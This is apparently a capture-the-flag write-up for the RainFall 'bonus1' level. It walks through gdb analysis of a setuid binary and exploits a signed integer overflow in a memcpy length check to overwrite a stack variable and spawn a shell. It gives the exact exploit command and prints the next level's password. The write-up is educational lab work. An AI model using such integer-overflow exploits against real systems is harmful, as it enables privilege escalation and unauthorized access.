# Solution

Here the code is pretty small no hidden function is possible and we can see that the binary can call execl("/bin/sh")

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+14h] [ebp-2Ch] BYREF
  int v5; // [esp+3Ch] [ebp-4h]

  v5 = atoi(argv[1]);
  if ( v5 > 9 )
    return 1;
  memcpy(&v4, argv[2], 4 * v5);
  if ( v5 == 1464814662 )
    execl("/bin/sh", &unk_8048580, 0);
  return 0;
}
```

We can also see from the code above that we need a specific value in v5 to enter the inside the if statement,
we can also see that v4 is written before v5 meaning that we can overwrite the value of v5 via memcpy the only trick here,
is that we actually use v5 as len value to copy so let's first find out what is the distance between v4 and v5,
and then let's find a way to input this distance properly since we cannot give a distance higher then 9.


So first let's try to find the distance between v4 and v5 this is simple let's go in gdb im using gdb-gef for extra feature,
one of this feature is search-pattern this will allow us to find instantly the v4 variable (of course we could also read the assembly and find instantly where v4 is).

So let's give random parameter first let's try argv[1] = 9 and argv[2] = "toto"

```sh
gef➤  b main
Breakpoint 1 at 0x8048427
gef➤  r "9" "toto"
```

So from here we need to break just after the call of memcpy to check where is located the v4 variable via search-pattern

```sh
gef➤  b *main+84
Breakpoint 2 at 0x8048478
```

```asm
   0x08048468 <+68>:    mov    DWORD PTR [esp+0x8],ecx
   0x0804846c <+72>:    mov    DWORD PTR [esp+0x4],edx
   0x08048470 <+76>:    mov    DWORD PTR [esp],eax
   0x08048473 <+79>:    call   0x8048320 <memcpy@plt>
=> 0x08048478 <+84>:    cmp    DWORD PTR [esp+0x3c],0x574f4c46
```

```sh
gef➤  search-pattern toto
[+] Searching 'toto' in memory
[+] In '[stack]'(0xfffdc000-0xffffe000), permission=rwx
  0xffffcb04 - 0xffffcb08  →   "toto"
  0xffffce29 - 0xffffce2d  →   "toto"
```

So we found two different address one is the address of argv[2] one is v4,
let's search the value of argv[0] via search-pattern so we can find which one is argv[2] and which one is v4,
the address closer to argv[0] address is the argv[2].
(Why not searching for argv[1] ? Well pretty simple pattern-search will probably find multiple occurence of "9")


```sh
gef➤  search-pattern bonus1
[+] Searching 'bonus1' in memory
[+] In '[stack]'(0xfffdc000-0xffffe000), permission=rwx
  0xffffce0e - 0xffffce26  →   "bonus1/Ressources/bonus1"
  0xffffce20 - 0xffffce26  →   "bonus1"
  0xffffcf90 - 0xffffcf96  →   "bonus1"
  0xffffcff2 - 0xffffd00a  →   "bonus1/Ressources/bonus1"
  0xffffd004 - 0xffffd00a  →   "bonus1"
  0xffffdf7e - 0xffffdf84  →   "bonus1"
  0xffffdfdf - 0xffffdfe5  →   "bonus1[...]"
  0xffffdff1 - 0xffffdff7  →   "bonus1[...]"
```

If we check the first address we find one that is really close of our toto it's the second address,
it's 3 byte close from one of our toto so the address of `0xffffce29` is the address of argv[2] and
`0xffffcb04` is the address of v4.

Now we only need to find the address of v5 this is pretty simple since we break just after memcpy,
and if we take a closer look to the assembly we do a cmp instruction which is the if statement,
that check if v5 as the right value.

```asm
   0x08048470 <+76>:    mov    DWORD PTR [esp],eax
   0x08048473 <+79>:    call   0x8048320 <memcpy@plt>
=> 0x08048478 <+84>:    cmp    DWORD PTR [esp+0x3c],0x574f4c46
   0x08048480 <+92>:    jne    0x804849e <main+122>
   0x08048482 <+94>:    mov    DWORD PTR [esp+0x8],0x0
```

So they fetch the address of v5 by doing `esp+0x3c` so let's check the value of esp+0x3c.

```sh
gef➤  x/xw $esp+0x3c
0xffffcb2c:     0x00000009
```

So we see the value 0x9, now we are sure this address is the value of v5 and the address of v5 is `0xffffcb2c`,
let's do some distance calculation on python3.

```python3
>>> print(abs(0xffffcb2c - 0xffffcb04))
40
```

So we now know the distance between v4 and v5 which is 40, 
the issue though is that we cannot input a value that is higher then 9

```c
v5 = atoi(argv[1]);
if ( v5 > 9 )
    return 1;
```

```asm
   0x08048441 <+29>:    cmp    DWORD PTR [esp+0x3c],0x9 ; compare the value of v5 to 9
   0x08048446 <+34>:    jle    0x804844f <main+43>      ; if it's less continue the execution of the program jmp at main+43
   0x08048448 <+36>:    mov    eax,0x1                  ; put 1 in eax  (return value).
   0x0804844d <+41>:    jmp    0x80484a3 <main+127>     ; jump to the end of the program and leave
```

First we need to focus on the asm part because the C generated code from ida doesn't show the reallity of everything.

Here take a close look at this line in C generated code from ida

```c
memcpy(&v4, argv[2], 4 * v5);
```

We can see that len argument for memcpy is multiplied by 4 using v5 as value for len,
so this is true this is what it's happening but this is not how it's done let me show you how this is done in asm

```asm
   0x0804844f <+43>:    mov    eax,DWORD PTR [esp+0x3c]
   0x08048453 <+47>:    lea    ecx,[eax*4+0x0]
```

This is how it's done in assembly, but the issue is that this is not `\[esp+0x3c\]*4` done which would be a simple,
multiplication done on value store at the address.

Here they do the multiplication using the `lea` instruction (Load Effective Address) so they will store the value in the `eax` register first,
then do a multiplication like if it was an address and store the result in `ecx` register.

so if i check with 9 as input this will be the value store in the `ecx` register.

```sh
gef➤  p/x $ecx
$6 = 0x24
gef➤  p/d $ecx
$7 = 36
```

So you might ask yourself, yes and everything is fine right ?
Well not really since we do a multiplication on the value store at a specific address using the lea function,
they will not care about any overflow done when you do the multiplication of course this is not entirly true,
if you give a number that will get multiplied by 4 and it output you an kernel address this will segfault.

But it will segfault when used not when calculated. And this is the trick that we need to use to exploit the v5,
and len argument to overwrite the value of v5 and do the right distance since we cannot do 40 byte distance.

Because it's check at the begining of the program, but we can use a simple leverage yet an effective one which is the signed variable !!

So we can input negative value but the funny thing about those negative value is that they have a specific representation in bit,
here for example let me show you -1 in bit representation for an int.

```sh
gef➤  p/t -1
$9 = 11111111111111111111111111111111
```
So all the bit are set to one but the interesting part is that this value will be cast to an size_t due to memcpy call,
and since size_t is unsigned value this will not be a negative value but the max size_t value.


So let's check what is happening when you provide argv[1] = "-1",
we need to break before the multiplication is done and check after the result.

```sh
gef➤  b *0x0804844f                                                                                                                                     │>>> print(bin(-1))
Breakpoint 5 at 0x804844f
gef➤  r "-1" "toto"
```

```asm
=> 0x0804844f <+43>:    mov    eax,DWORD PTR [esp+0x3c]
   0x08048453 <+47>:    lea    ecx,[eax*4+0x0]
   0x0804845a <+54>:    mov    eax,DWORD PTR [ebp+0xc]
```

Let's check the `eax` register before the multiplication and check the `ecx` register after the multiplication

```sh
gef➤  p/x $eax
$10 = 0xffffffff
gef➤  p/d $eax
$11 = -1
```

Multiplication done here is the value store in `ecx` register

```sh
gef➤  p/x $ecx
$12 = 0xfffffffc
gef➤  p/d $ecx
$13 = -4
gef➤  p/u $ecx
$14 = 4294967292
```

So we can see the multiplication was done properly i show also the value in unsigned and signed/hexadecimal,
if we take a look the len argument would be massive this is not really good we dont want to overwrite address,
that might make the program to crash so we need to find a way to overwrite only 40 or close to 40 byte distance.

So what do we know if we do a quick recap we know that we can pass negative value to v5 and it will be multiplied by 4
we know that this value will be passed to unsigned parameter meaning it will not be negative and, 
we know that we need a distance or 40 byte or close to 40 byte distance.

Since we are doing a multiplication you can do something pretty simple and clever to avoid having a high value in len, 
multiplication by 0 is always equal to 0, so if we have a number with the msb and lsb (most significant byte and least significant byte) set,
and all 0 between we can leverage the 32bit binary and have in the register only the lsb multiplication store. 

So let's find that number so pretty simple the min int is equal to -2147483648/0x80000000, 
so from this we can now do the modification to get 0a on the lsb (10),
so the multiplcation of -2147483638/0x8000000a will result to in hex 0x200000028
0x28 is equal to 40 and since the value is to high to enter a 32bit register if we check the value of `ecx` register we have this value.

```sh
gef➤  p/x $ecx
$15 = 0x28
gef➤  p/d $ecx
$16 = 40
gef➤  p/u $ecx
$17 = 40
```

Perfect so now we know that we can reach the distance by using this value little issue though,
since we need to overwrite 4 byte to get the proper value we need to 44 len 
so let's just reduce the value -2147483638 to -2147483637.


```sh
gef➤  p/x $ecx
$20 = 0x2c
gef➤  p/d $ecx
$21 = 44
gef➤  p/u $ecx
$22 = 44
```

Perfect now we have the perfect len we just need to overwrite v5 properly this is actually the simple part,
we need to write 0x574f4c46 inside v5 so we need to take each byte and see what char it will give us,
this will give us WOLF so we need 40 padding character and WOLF but since it's little-endian we need FLOW.

```sh
$~: perl -e 'print "A"x40 . "FLOW"'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW
```

So now let's try to input -2147483637 and AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW

```sh
bonus1@RainFall:~$ ./bonus1 "-2147483637" "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW"
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
$ 
```
TADA Finished.
